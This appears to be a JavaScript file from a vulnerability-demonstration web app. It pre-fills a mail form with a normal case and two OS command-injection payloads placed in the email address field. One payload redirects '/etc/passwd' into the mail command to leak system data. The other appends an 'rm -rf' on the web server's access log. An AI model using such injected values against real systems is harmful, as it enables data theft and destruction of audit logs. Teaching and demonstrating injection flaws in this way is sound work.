(function(){
  "use strict";

  //Valiable
    let selectMethodMsg = {
      '1':"想定されたケースで入力されたメールアドレスを送信します",
      '2':"攻撃コードを入力して<span class='text-danger font-weight-bold'>システム情報</span>を不正入手します（システム情報漏洩）",
      '3':"攻撃コードを入力して<span class='text-danger font-weight-bold'>システム情報を削除</span>します (システム破壊)"
    };

  //Event
    $("select[name='method']").on("change", changeMethod);

  //Method

    function changeMethod(e){
      var mcode = $("select[name='method']").val();
      $("#selectMsg").html(selectMethodMsg[mcode]);

      $("#mcode").val(mcode);
      //auto input
      switch(mcode){
        case "1":
          $("#user_mail_address").val("alchemy.allconnect@gmail.com");
          $("#user_mail_subject").val("これはテストメールです");
          $("#user_mail_body").val("VULNEからのテストメールです");
          break;
        case "2":
          $("#user_mail_address").val("alchemy.allconnect@gmail.com < /etc/passwd #");
          $("#user_mail_subject").val("これはテストメールです");
          $("#user_mail_body").val("VULNEからのテストメールです");
          break;
        case "3":
          $("#user_mail_address").val("alchemy.allconnect@gmail.com; rm -rf /var/log/httpd/access_log #");
          $("#user_mail_subject").val("これはテストメールです");
          $("#user_mail_body").val("VULNEからのテストメールです");
          break;
      }

    }

  //Init

})();